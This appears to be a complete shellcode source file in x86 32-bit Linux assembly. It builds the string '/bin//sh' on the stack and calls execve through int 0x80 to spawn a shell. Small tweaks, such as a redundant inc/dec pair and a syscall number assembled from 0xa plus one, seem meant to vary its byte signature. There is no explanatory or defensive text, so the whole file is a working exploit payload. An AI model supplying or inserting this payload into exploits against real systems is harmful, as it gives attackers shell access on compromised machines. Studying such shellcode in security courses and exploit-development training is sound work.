global _start

section .text

_start:
	sub eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	inc eax
	dec eax
	push eax
	push ebx
	mov ecx, esp
	mov al, 0xa
	inc al
	int 0x80
